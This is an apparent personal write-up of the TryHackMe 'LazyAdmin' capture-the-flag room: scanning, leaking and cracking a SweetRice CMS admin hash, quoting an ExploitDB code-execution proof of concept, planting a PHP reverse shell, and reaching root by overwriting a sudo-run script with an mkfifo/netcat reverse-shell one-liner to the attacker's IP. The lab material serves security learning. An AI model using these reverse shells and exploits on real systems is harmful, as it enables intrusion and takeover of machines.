---
title: "THM: LazyAdmin"
date: 2023-12-27 21:26:33
categories:
  - TryHackMe
tags:
  - TryHackMe
  - Linux
  - Reverse Shell
  - Privilege Escalation
---

# Introduction

 This is a writeup for the room [LazyAdmin](https://tryhackme.com/room/lazyadmin) on [TryHackMe](https://tryhackme.com/). LazyAdmin is a beginner level room that focuses on Linux exploitation.

This room is pretty similar to the other rooms I've done, with reverse shells, web servers, CMSes and privilege escalation. Nonetheless, it was a good avenue for me to apply what I've learnt B-)

# Enumeration

## Nmap

As usual, we start with our Nmap scan.

```bash
nmap -sC -sV <ip>
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 21:25 +08
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 36.86% done; ETC: 21:26 (0:00:27 remaining)
Stats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 21:27 (0:00:07 remaining)
Nmap scan report for <ip>
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Here, we see two ports open, SSH and HTTP.

Let's start at the web server.

## Web Server

The web server is the default Apache2 Ubuntu page.

![Apache2 Ubuntu Default Page](./img/lazyadmin/1.png)

Doesn't seem like we can do much here. So let's run a directory brute force.

## Dirb

```bash
dirb http://<ip>
```

```bash
---- Scanning URL: http://<ip>/ ----
==> DIRECTORY: http://<ip>/content/
+ http://<ip>/index.html (CODE:200|SIZE:11321)
+ http://<ip>/server-status (CODE:403|SIZE:278)

---- Entering directory: http://<ip>/content/ ----
==> DIRECTORY: http://<ip>/content/_themes/
```

(Accidentally stopped the scan here...)

The results took quite a bit of time, so I looked at the results as it came in. The first result was `/content/`.

![Content](./img/lazyadmin/2.png)

Seems like some sort of CMS (Content Management System) thing. As per one of the last labs, there was a CVE related to Fuel CMS. I checked if this CMS had an entry in ExploitDB.

![ExploitDB](./img/lazyadmin/3.png)

Seems like there are a few! While we don't know what exact version this SweetRice CMS is, I looked through the various exploits. `Arbitrary File Upload` seemed like it could be useful in getting a reverse shell and `Backup Disclosure` seemed like it could be useful in getting some credentials. `Cross-Site Request Forgery / PHP Code Execution` seemed like it could be useful in getting a reverse shell as well.

# Exploit

## Backup Disclosure

The first exploit I looked into was `Backup Disclosure`.

```
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

It seems like we could get some MySQL backups. Going to the `<ip>/inc/mysql_backup` directory, there was unfortunately nothing there.

![MySQL Backup](./img/lazyadmin/4.png)

After a bit of thinking and poking around, I realised that the home directory wasn't even the CMS haha... I had to go to `<ip>/content/inc/mysql_backup` instead.

![MySQL Backup](./img/lazyadmin/5.png)

From there, there was a backup file present. I downloaded it and had a look at it.

![MySQL Backup](./img/lazyadmin/6.png)

Googling about MySQL backups, I found that it was a set of PHP commands used to interact with the MySQL database. Within it, there was a username and hashed password.

![MySQL Backup](./img/lazyadmin/7.png)

```
"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is build
```

I tried going to [CrackStation](https://crackstation.net/) to crack it and it worked.

![MySQL Backup](./img/lazyadmin/8.png)

Now that we have the credentials, we can move on to logging in to the CMS. Except... I don't know where the login page is. Earlier on, I very coincidentally stopped the `dirb` as it was going through the `/content` directory.

Once again, I had to use `dirb` to find pages within `/content`.

```bash
==> DIRECTORY: http://<ip>/content/_themes/
==> DIRECTORY: http://<ip>/content/as/
==> DIRECTORY: http://<ip>/content/attachment/
```

The `as` directory seemed the most interesting, so I went to it. Sure enough, it was the login page we were looking for. Logging in with the credentials we found earlier, we get access to the dashboard.

![as](./img/lazyadmin/9.png)

And now, we can see the dashboard.

![dashboard](./img/lazyadmin/10.png)

But just being able to see the dashboard isn't really enough for us to do anything. I was a little stuck, so I looked at the other exploits.

## Cross-Site Request Forgery / PHP Code Execution

From ExploitDB:

```
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerability In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo();
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```

So this seems like an admin can add a malicious 'ad' to the website which can be a PHP file. Thus, we could probably use this to get a reverse shell, since we already have admin access.

### Reverse Shell - User Flag

Using the usual PHP reverse shell from [pentestmonkey](www.github.com/pentestmonkey/php-reverse-shell), I modified the exploit's IP to match my host's IP.

```PHP
$ip = '<host_ip>';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Next, I uploaded the PHP exploit on the `ads` tab on the dashboard, giving it the name `exploit`, and submitted it.

![ads](./img/lazyadmin/11.png)

From there, I started a netcat listener on my host device.

```bash
nc -lvnp 1234
```

Then, to run the exploit, I went to `http://<ip>/content/inc/ads/exploit`.

On my netcat listener, I got a connection! I then stabilised the shell so that I could use more commands.

![stabilise](./img/lazyadmin/12.png)

Once that was done, I navigated to the home directory and found the user flag.

![userflag](./img/lazyadmin/13.png)

### Privilege Escalation - Root Flag

Now, we have to find out how to escalate our privileges to root. Running `sudo -l`, we can see what commands we can run as root.

```bash
www-data@THM-Chal:/$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

That's wild. We can run a Perl script `backup.pl` as root. Let's check out the file. Looking at the permissions:

```bash
www-data@THM-Chal:/$ ls -la /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
```

We can see that we can only read and execute the file. That's a bummer, since we can't edit the file. But first, let's see what the file does.

```bash
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
```

```pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

So it runs a shell script `copy.sh` in the `/etc` directory. Similarly, let's check out the permissions and see what the contents of the file are.

```bash
www-data@THM-Chal:/$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
www-data@THM-Chal:/$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Firstly, we have `rwx` permissions on it, which means that we can edit the file. Secondly, its pretty interesting that `/etc/copy.sh`... is a reverse shell. What we need to do is to edit the IP address and set up a netcat listener.

Amazingly, the system did not have any text editors installed/enabled :|

![noeditors](./img/lazyadmin/14.png)

Alright fine. We can use echo instead to overwrite the file. Being a lazy pleb, I went to a [Reverse Shell Generator](https://www.revshells.com/) to generate a similar reverse shell.

```bash
www-data@THM-Chal:/$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.95.111 2345 >/tmp/f" > /etc/copy.sh
www-data@THM-Chal:/$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.95.111 2345 >/tmp/f
```

After running the netcat listener, we can run the Perl script as root.

```bash
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
```

From there, we get a root shell! We can now get the root flag.

![rootflag](./img/lazyadmin/15.png)

# Conclusion

This was a rather easy room for me, and I do like that there were multiple ways to solve it (with the various exploits). I'm definitely feeling more confident in my skills in solving the easier rooms, and hopefully I can move on to the harder ones soon! :D
